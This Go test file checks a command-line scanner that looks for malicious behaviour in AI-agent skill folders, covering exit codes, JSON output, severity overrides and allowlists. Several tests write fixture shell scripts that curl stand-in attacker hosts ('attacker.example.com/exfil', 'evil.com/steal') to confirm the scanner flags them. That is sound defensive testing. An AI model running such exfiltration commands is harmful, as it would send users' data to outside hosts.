package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/velzepooz/skill-detector/pkg/model"
)

func TestVersionCommand(t *testing.T) {
	rootCmd := newRootCmd()
	buf := new(bytes.Buffer)
	rootCmd.SetOut(buf)
	rootCmd.SetArgs([]string{"version"})

	err := rootCmd.Execute()
	if err != nil {
		t.Fatalf("version command returned error: %v", err)
	}

	got := buf.String()
	if !strings.Contains(got, version) {
		t.Errorf("version output missing version string, got %q", got)
	}
	if !strings.Contains(got, "rules") {
		t.Errorf("version output missing rule count, got %q", got)
	}
	if !strings.Contains(got, "checksum") {
		t.Errorf("version output missing checksum, got %q", got)
	}
}

func TestScanNoArgs(t *testing.T) {
	rootCmd := newRootCmd()
	rootCmd.SetArgs([]string{"scan"})

	err := rootCmd.Execute()
	if err == nil {
		t.Fatal("scan with no args should return an error")
	}
}

func TestScanCmd_CleanScan(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if scanExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", scanExitCode)
	}
	output := stdout.String()
	if !strings.Contains(output, "No concerns") {
		t.Errorf("expected 'No concerns' verdict in output, got: %s", output)
	}
}

func TestScanCmd_MaliciousScan(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if scanExitCode != 2 {
		t.Errorf("expected exit code 2, got %d", scanExitCode)
	}
	output := stdout.String()
	if !strings.Contains(output, "credential") {
		t.Errorf("expected credential finding in output, got: %s", output)
	}
}

func TestScanCmd_ChecksumMismatch(t *testing.T) {
	// Set a wrong expected checksum to trigger mismatch error.
	oldChecksum := expectedChecksum
	expectedChecksum = "deadbeefdeadbeef"
	defer func() { expectedChecksum = oldChecksum }()

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected checksum mismatch error")
	}
	if !strings.Contains(err.Error(), "checksum mismatch") {
		t.Errorf("expected checksum mismatch in error, got: %v", err)
	}
}

func TestScanCmd_ChecksumEmptySkipsVerification(t *testing.T) {
	// Empty expectedChecksum (dev builds) should skip verification.
	oldChecksum := expectedChecksum
	expectedChecksum = ""
	defer func() { expectedChecksum = oldChecksum }()

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error with empty checksum: %v", err)
	}
}

func TestScanCmd_InvalidPath(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "/nonexistent/path"})

	scanExitCode = 0
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected error for invalid path")
	}
}

func TestScanCmd_StdoutStderrSeparation(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	_ = cmd.Execute()

	if !strings.Contains(stdout.String(), "credential") {
		t.Error("findings should appear on stdout")
	}
	if stderr.String() != "" {
		t.Errorf("expected no stderr output, got: %s", stderr.String())
	}
}

func TestExitCode(t *testing.T) {
	tests := []struct {
		name      string
		findings  []model.Finding
		threshold model.Severity
		want      int
	}{
		{
			name:      "no findings returns 0",
			findings:  nil,
			threshold: model.SeverityCritical,
			want:      0,
		},
		{
			name: "critical finding with critical threshold returns 2",
			findings: []model.Finding{
				{EffSeverity: model.SeverityCritical},
			},
			threshold: model.SeverityCritical,
			want:      2,
		},
		{
			name: "high finding with critical threshold returns 1",
			findings: []model.Finding{
				{EffSeverity: model.SeverityHigh},
			},
			threshold: model.SeverityCritical,
			want:      1,
		},
		{
			name: "high finding with high threshold returns 2",
			findings: []model.Finding{
				{EffSeverity: model.SeverityHigh},
			},
			threshold: model.SeverityHigh,
			want:      2,
		},
		{
			name: "medium finding with high threshold returns 1",
			findings: []model.Finding{
				{EffSeverity: model.SeverityMedium},
			},
			threshold: model.SeverityHigh,
			want:      1,
		},
		{
			name: "mixed with critical returns 2",
			findings: []model.Finding{
				{EffSeverity: model.SeverityMedium},
				{EffSeverity: model.SeverityCritical},
			},
			threshold: model.SeverityCritical,
			want:      2,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := model.ScanResult{Findings: tt.findings}
			got := exitCode(result, tt.threshold)
			if got != tt.want {
				t.Errorf("exitCode() = %d, want %d", got, tt.want)
			}
		})
	}
}

func TestScanCmd_JSONFormatClean(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--format", "json", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !json.Valid(stdout.Bytes()) {
		t.Fatalf("output is not valid JSON: %s", stdout.String())
	}

	var result model.ScanResult
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("failed to unmarshal JSON: %v", err)
	}
	if result.SchemaVersion != "1.1" {
		t.Errorf("schema_version = %q, want %q", result.SchemaVersion, "1.1")
	}
	if len(result.ConfigOverrides) != 0 {
		t.Errorf("expected no config_overrides for clean scan, got %d", len(result.ConfigOverrides))
	}
}

func TestScanCmd_JSONFormatMalicious(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--format", "json", "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var result model.ScanResult
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("failed to unmarshal JSON: %v", err)
	}
	if len(result.Findings) == 0 {
		t.Error("expected findings in JSON output for malicious skill")
	}
}

func TestScanCmd_JSONFormatIncludesConfigOverrides(t *testing.T) {
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	configPath := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(configPath, []byte("rules:\n  SD-007:\n    severity: medium\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--format", "json", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var result model.ScanResult
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("failed to unmarshal JSON: %v", err)
	}
	if len(result.ConfigOverrides) != 1 {
		t.Fatalf("expected 1 config override, got %d", len(result.ConfigOverrides))
	}
	override := result.ConfigOverrides[0]
	if override.RuleID != "SD-007" {
		t.Errorf("rule_id = %q, want SD-007", override.RuleID)
	}
	if override.Field != "severity" {
		t.Errorf("field = %q, want severity", override.Field)
	}
	if override.Original != "HIGH" {
		t.Errorf("original = %q, want HIGH", override.Original)
	}
	if override.Override != "MEDIUM" {
		t.Errorf("override = %q, want MEDIUM", override.Override)
	}
}

func TestScanCmd_JSONFormatNoANSI(t *testing.T) {
	var stdout bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(new(bytes.Buffer))
	cmd.SetArgs([]string{"scan", "--format", "json", "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	_ = cmd.Execute()

	if strings.Contains(stdout.String(), "\033[") {
		t.Error("JSON output contains ANSI escape codes")
	}
}

func TestScanCmd_QuietClean(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--quiet", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if stdout.String() != "" {
		t.Errorf("expected empty stdout in quiet mode, got: %q", stdout.String())
	}
	if scanExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", scanExitCode)
	}
}

func TestScanCmd_QuietMalicious(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--quiet", "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if stdout.String() != "" {
		t.Errorf("expected empty stdout in quiet mode, got: %q", stdout.String())
	}
	if scanExitCode != 2 {
		t.Errorf("expected exit code 2, got %d", scanExitCode)
	}
}

func TestScanCmd_QuietInvalidPath(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--quiet", "/nonexistent/path"})

	scanExitCode = 0
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected error for invalid path")
	}
	if stdout.String() != "" {
		t.Errorf("expected empty stdout in quiet mode, got: %q", stdout.String())
	}
}

func TestScanCmd_QuietOverridesJSON(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--quiet", "--format", "json", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if stdout.String() != "" {
		t.Errorf("expected empty stdout when --quiet overrides --format json, got: %q", stdout.String())
	}
	if scanExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", scanExitCode)
	}
}

func TestScanCmd_QuietShortFlag(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "-q", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if stdout.String() != "" {
		t.Errorf("expected empty stdout with -q flag, got: %q", stdout.String())
	}
	if scanExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", scanExitCode)
	}
}

func TestScanCmd_UnsupportedFormat(t *testing.T) {
	var stdout bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(new(bytes.Buffer))
	cmd.SetArgs([]string{"scan", "--format", "invalid", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected error for unsupported format")
	}
	if !strings.Contains(err.Error(), "unsupported format") {
		t.Errorf("expected 'unsupported format' in error, got: %v", err)
	}
}

// --- CLI integration tests for config flags (Story 4.1) ---

func TestScanCmd_DefaultThresholdCritical(t *testing.T) {
	// No config, no --fail-on flag → default Critical threshold.
	// credential-theft has critical findings → exit code 2.
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if scanExitCode != 2 {
		t.Errorf("expected exit code 2 (critical threshold default), got %d", scanExitCode)
	}
}

func TestScanCmd_FailOnHighWithCleanSkill_ExitCode0(t *testing.T) {
	// clean skill has no findings → exit code 0 regardless of threshold.
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--fail-on", "high", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if scanExitCode != 0 {
		t.Errorf("expected exit code 0 for clean skill with --fail-on high, got %d", scanExitCode)
	}
}

func TestScanCmd_FailOnHighWithHighFindings(t *testing.T) {
	// credential-theft has critical findings → with --fail-on high, critical >= high → exit code 2.
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--fail-on", "high", "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if scanExitCode != 2 {
		t.Errorf("expected exit code 2 with --fail-on high and critical findings, got %d", scanExitCode)
	}
}

func TestScanCmd_ConfigFlagCustomFile(t *testing.T) {
	dir := t.TempDir()
	configPath := filepath.Join(dir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("fail_on: high\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, "../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// credential-theft has critical findings, --config sets fail_on: high → exit code 2.
	if scanExitCode != 2 {
		t.Errorf("expected exit code 2 with config fail_on: high, got %d", scanExitCode)
	}
}

func TestScanCmd_ConfigFlagNonexistent(t *testing.T) {
	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--config", "/nonexistent/config.yaml", "../../testdata/clean/simple-skill"})

	scanExitCode = 0
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected error for nonexistent config file")
	}
}

func TestScanCmd_MalformedConfigInScanDir(t *testing.T) {
	// Create a temp dir with a malformed .skill-detectorrc, copy testdata into it.
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, ".skill-detectorrc"), []byte("fail_on: [broken\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	// Create a minimal skill structure so the scan path is valid.
	if err := os.MkdirAll(filepath.Join(dir, "skill"), 0o750); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", filepath.Join(dir, "skill")})

	scanExitCode = 0
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected error for malformed .skill-detectorrc")
	}
}

// --- Integration tests for rule overrides & severity customization (Story 4.2) ---

// writeSkillDetectorRC writes a .skill-detectorrc in dir with the given content.
func writeSkillDetectorRC(t *testing.T, dir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, ".skill-detectorrc"), []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// writeSkillFile writes a file in dir with the given content.
func writeSkillFile(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// SD-007 fires on shell scripts containing curl/https URLs.
const sd007Content = "#!/bin/bash\ncurl https://attacker.example.com/exfil\n"

func TestScanCmd_FailOn_OnlyMediumFindings_ExitCode1(t *testing.T) {
	// Create a skill that only triggers SD-007 (HIGH by default).
	// Override SD-007 to medium via config, use --fail-on high → exit 1.
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)
	writeSkillDetectorRC(t, dir, "rules:\n  SD-007:\n    severity: medium\n")

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--fail-on", "high", dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// All findings overridden to medium → below high threshold → exit code 1.
	if scanExitCode != 1 {
		t.Errorf("expected exit code 1 (medium findings below high threshold), got %d\nstdout: %s", scanExitCode, stdout.String())
	}
}

func TestScanCmd_FailOn_HighFindings_ExitCode2(t *testing.T) {
	// SD-007 is HIGH by default; with --fail-on high and no override → exit 2.
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--fail-on", "high", dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if scanExitCode != 2 {
		t.Errorf("expected exit code 2 (high finding at high threshold), got %d\nstdout: %s", scanExitCode, stdout.String())
	}
}

func TestScanCmd_SeverityOverride_LowersThreshold_ExitCode1(t *testing.T) {
	// AC7: override SD-007 from high to medium, --fail-on high, only SD-007 fires → exit 1.
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("fail_on: high\nrules:\n  SD-007:\n    severity: medium\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// SD-007 overridden to medium; fail_on: high → medium < high threshold → exit 1.
	if scanExitCode != 1 {
		t.Errorf("expected exit code 1 (severity lowered below fail-on threshold), got %d\nstdout: %s", scanExitCode, stdout.String())
	}
}

func TestScanCmd_DisabledRule_NoFindings(t *testing.T) {
	// Config disabling SD-007 → no SD-007 findings in output.
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("rules:\n  SD-007:\n    enabled: false\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(stdout.String(), "SD-007") {
		t.Errorf("expected no SD-007 findings when rule is disabled, got output: %s", stdout.String())
	}
	if scanExitCode != 0 {
		t.Errorf("expected exit code 0 (no findings after disabling SD-007), got %d", scanExitCode)
	}
}

func TestScanCmd_InvalidRuleSeverity_ErrorAndExit1(t *testing.T) {
	// Config with invalid rule severity → error reported, exit code 1.
	dir := t.TempDir()
	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("rules:\n  SD-007:\n    severity: extreme\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected error for invalid rule severity in config")
	}
	if !strings.Contains(err.Error(), "invalid severity") {
		t.Errorf("expected 'invalid severity' in error, got: %v", err)
	}
}

// --- Integration tests for allowlists (Story 4.3) ---

func TestScanCmd_NetworkAllowlist_SuppressesMatchingDomain(t *testing.T) {
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncurl https://api.trusted-domain.com/data\n")

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "config.yaml")
	if err := os.WriteFile(configPath, []byte("allow:\n  network:\n    - \"api.trusted-domain.com\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(stdout.String(), "api.trusted-domain.com") {
		t.Errorf("expected allowlisted domain to be suppressed, got output: %s", stdout.String())
	}
}

func TestScanCmd_FilesystemAllowlist_SuppressesMatchingPath(t *testing.T) {
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncat /usr/local/share/data\n")

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "config.yaml")
	if err := os.WriteFile(configPath, []byte("allow:\n  filesystem:\n    - \"/usr/local/share\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(stdout.String(), "/usr/local/share") {
		t.Errorf("expected allowlisted path to be suppressed, got output: %s", stdout.String())
	}
}

func TestScanCmd_AllowlistJSON_SuppressedFindingsExcluded(t *testing.T) {
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncurl https://api.trusted-domain.com/data\ncurl https://evil.com/steal\n")

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "config.yaml")
	if err := os.WriteFile(configPath, []byte("allow:\n  network:\n    - \"api.trusted-domain.com\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--format", "json", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var result model.ScanResult
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("failed to unmarshal JSON: %v", err)
	}
	for _, f := range result.Findings {
		if strings.Contains(f.Description, "api.trusted-domain.com") {
			t.Errorf("JSON output should not include suppressed finding, got: %s", f.Description)
		}
	}
	// evil.com finding should still be present
	found := false
	for _, f := range result.Findings {
		if strings.Contains(f.Description, "evil.com") {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected non-allowlisted evil.com finding to remain in JSON output")
	}
}

func TestScanCmd_AllowlistNonMatchingStillReported(t *testing.T) {
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncurl https://evil.com/steal\n")

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "config.yaml")
	if err := os.WriteFile(configPath, []byte("allow:\n  network:\n    - \"api.trusted-domain.com\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(stdout.String(), "evil.com") {
		t.Errorf("expected non-allowlisted finding to remain in output, got: %s", stdout.String())
	}
}

func TestScanCmd_FailOnOverridesConfig(t *testing.T) {
	// Config file says fail_on: info, but CLI flag --fail-on critical should override.
	dir := t.TempDir()
	configPath := filepath.Join(dir, "config.yaml")
	if err := os.WriteFile(configPath, []byte("fail_on: info\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, "--fail-on", "critical",
		"../../testdata/malicious/credential-theft"})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// --fail-on critical overrides config's fail_on: info → only critical findings trigger exit 2.
	if scanExitCode != 2 {
		t.Errorf("expected exit code 2 (CLI --fail-on critical overrides config), got %d", scanExitCode)
	}
}

// --- Integration tests for context profiles (Story 5.3) ---

func TestScanCmd_ContextExpected_ExitCode(t *testing.T) {
	// context: expected for SD-007 → EffSeverity=INFO → exit code NOT 2 even with --fail-on high.
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("fail_on: high\nrules:\n  SD-007:\n    context: expected\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// SD-007 with context: expected → EffSeverity=INFO, below high threshold → exit 1.
	if scanExitCode != 1 {
		t.Errorf("expected exit code 1 (context: expected lowers EffSeverity to INFO), got %d\nstdout: %s", scanExitCode, stdout.String())
	}
}

func TestScanCmd_ContextExpected_TextOutput(t *testing.T) {
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("rules:\n  SD-007:\n    context: expected\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	got := stdout.String()
	if !strings.Contains(got, "(expected)") {
		t.Errorf("expected '(expected)' in text output for context: expected rule, got: %s", got)
	}
}

func TestScanCmd_ContextExpected_JSONOutput(t *testing.T) {
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("rules:\n  SD-007:\n    context: expected\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--format", "json", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var result model.ScanResult
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("failed to unmarshal JSON: %v", err)
	}
	finding := findFindingByRule(t, result.Findings, "SD-007")
	if finding.EffSeverity != model.SeverityInfo {
		t.Errorf("expected effective_severity INFO for SD-007 with context override, got %v", finding.EffSeverity)
	}

	// Should have context override in config_overrides.
	found := false
	for _, co := range result.ConfigOverrides {
		if co.Field == "context" && co.Override == "expected" && co.RuleID == "SD-007" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected context override in config_overrides, got: %+v", result.ConfigOverrides)
	}
}

func TestScanCmd_LegacySeverityOverride_StillWorks(t *testing.T) {
	// Existing severity override behavior must be unchanged.
	dir := t.TempDir()
	writeSkillFile(t, dir, "run.sh", sd007Content)

	cfgDir := t.TempDir()
	configPath := filepath.Join(cfgDir, "custom.yaml")
	if err := os.WriteFile(configPath, []byte("fail_on: high\nrules:\n  SD-007:\n    severity: medium\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	cmd := newRootCmd()
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"scan", "--no-color", "--config", configPath, dir})

	scanExitCode = 0
	err := cmd.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// SD-007 overridden to medium; fail_on: high → medium < high → exit 1.
	if scanExitCode != 1 {
		t.Errorf("expected exit code 1 (legacy severity override still works), got %d", scanExitCode)
	}
}
